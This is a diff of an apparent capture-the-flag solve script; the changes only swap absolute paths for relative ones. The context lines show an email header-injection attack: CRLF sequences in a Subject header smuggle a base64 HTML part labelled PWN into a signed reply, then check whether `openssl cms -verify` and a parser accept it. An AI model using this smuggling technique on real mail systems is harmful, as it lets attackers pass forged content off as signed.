@@ -16,7 +16,7 @@ D = ("\r\n\r\n"
      "\n--" + B1 + " \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n"
      + b64 + "\n--" + B1 + "-- ")
 
-TEMPLATE = open('/mnt/d/ctf-index/_z_496/template.jinja2').read()
+TEMPLATE = open('./_z_496/template.jinja2').read()
 BODY = "\n\n".join([
     "We've gotten your message and will respond soon.",
     "Thank you for choosing SES!",
@@ -44,10 +44,10 @@ head, rest = raw.split('\n\n', 1)
 hdr = head + '\nFrom: admin@ses\nTo: admin@ses\nSubject: Re: ' + D
 reply = hdr + '\n' + rest
 open('reply5.eml', 'w').write(reply)
-open('/mnt/d/ctf-index/_z_496_emls/reply5.eml', 'w').write(reply)
+open('./_z_496_emls/reply5.eml', 'w').write(reply)
 
 def parse(path, label):
-    r = subprocess.run(['node', '/mnt/d/ctf-index/_z_496_parse.js', path], capture_output=True, text=True)
+    r = subprocess.run(['node', './_z_496_parse.js', path], capture_output=True, text=True)
     out = r.stdout.strip()
     print('===============', label, '===============')
     try:
@@ -62,13 +62,13 @@ def parse(path, label):
 
 print('PWN =', PWN)
 print('B1  =', B1)
-j1 = parse('/mnt/d/ctf-index/_z_496_emls/reply5.eml', 'TOP-LEVEL parse of reply')
+j1 = parse('./_z_496_emls/reply5.eml', 'TOP-LEVEL parse of reply')
 print('html == PWN ?', bool(j1 and j1.get('html') == PWN))
 
 r = subprocess.run(['openssl', 'cms', '-verify', '-in', 'reply5.eml', '-CAfile', 'cert.pem', '-out', 'out5.txt'],
                    capture_output=True, text=True)
 print('verify rc', r.returncode, r.stderr.strip()[:200])
 if r.returncode == 0:
-    open('/mnt/d/ctf-index/_z_496_emls/out5.eml', 'w').write(open('out5.txt').read())
-    j2 = parse('/mnt/d/ctf-index/_z_496_emls/out5.eml', 'parse of VERIFIED content')
+    open('./_z_496_emls/out5.eml', 'w').write(open('out5.txt').read())
+    j2 = parse('./_z_496_emls/out5.eml', 'parse of VERIFIED content')
     print('html == PWN ?', bool(j2 and j2.get('html') == PWN))
